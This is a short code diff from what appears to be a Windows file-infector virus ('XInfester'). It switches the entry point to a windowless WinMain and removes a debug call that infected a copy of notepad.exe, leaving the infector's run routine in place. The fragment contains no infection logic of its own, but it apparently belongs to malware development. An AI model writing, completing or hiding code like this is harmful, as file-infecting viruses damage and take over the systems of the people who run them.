@@ -23,17 +23,11 @@ BOOL IsAlreadyRunning()
 	return FALSE;
 }
 
-int main()
-//int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
+int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
 {
-
-	XInfester_InfestFile("J:\\notepad.exe");
 	//X Infester starter
 	XInfester_Run();
 
-	printf("Hello World");
-	getchar();
-	return 0;
 	if (IsAlreadyRunning())
 	{
 		exit(0);
